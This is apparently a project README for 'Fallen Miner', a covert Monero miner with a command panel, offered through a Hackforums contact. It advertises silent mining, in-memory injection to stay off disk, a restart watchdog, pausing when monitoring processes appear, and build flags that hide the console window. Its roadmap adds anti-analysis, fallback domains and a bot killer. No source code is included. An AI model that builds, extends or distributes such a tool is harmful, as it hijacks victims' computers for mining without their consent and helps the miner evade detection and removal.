
Fallen Miner
==========

![enter image description here](https://i.imgur.com/np4viC8.png)

### Information

Fallen Miner is an open source, silent XMR miner. The readme will detail features, installation and the roadmap for this project.


#### Disclaimer
I have modified the base xmrig file to have a 2% donation fee, if you wish to disable this, please go to /src/donate.h and set the values to 0.

#### Donate
If you change the donation fee to 0, please consider a one off donation, I have put work into this project so anything is appreciated :)

SOL: F1EtBxf4sPhUsfPdA2jVFfqJ7eLbbkxx4f2ujVhuPrxT
XMR: 85VkL5hw9YceMWVHPGNoFgLxQxw6qwNdF51uAz96WPYmhDYwswVHhoaWPXWjvFGBstGhUNBgR9UvqcqVvYHDmAvcC9yPy4S

Features
-----------------------

 -   Silent XMR Mining  
    
-   Watchdog to detect the miner process and restart if not running  
    
-   Memory injection to keep the miner off disk  

-   "Process watch" to pause mining if certain processes are detected running
    
-   On the fly configurations, to update when needed  
    
-   XMRig Proxy Integration

### Panel Images
![enter image description here](https://i.imgur.com/If0LcCI.png)

![enter image description here](https://i.imgur.com/np4viC8.png)![enter image description here](https://i.imgur.com/w6xSa5w.png)![](https://i.imgur.com/gEf4fie.png)
![enter image description here](https://i.imgur.com/Qe1Pdde.png)
![enter image description here](https://i.imgur.com/RCM8JXl.png)

Installation
------------
golang is required for both building the client and server, so they will need to be installed.
for building the client, just compile as standard (go build) however if you want a non console version, you will need to declare this in the build arguments. (go build -ldflags="-H=windowsgui")

for the server, CGO needs to be enabled as it is required for sqlite, however beyond this the compilation is the exact same as the client. Cross compiling shouldn't run into issues, however you'll need to bring your own xmrig proxy as the windows one is included by default, no code will need to be changed beyond the config file being the same as the http api needs to be enabled

to register an account, go to the /register route and enter your information, then head to /login to login.

Contact me
----------
My hackforums account:  
https://hackforums.net/member.php?action=profile&uid=4880700

## Roadmap

 - SSL support
 - Remote config separate from the panel (pastebin etc)
 - Fallback domain system
 - Anti Analysis
 - BotKiller

### Issues
If you notice a bug or any other issue that isn't installation, please feel free to contact me directly, or open an issue on github.

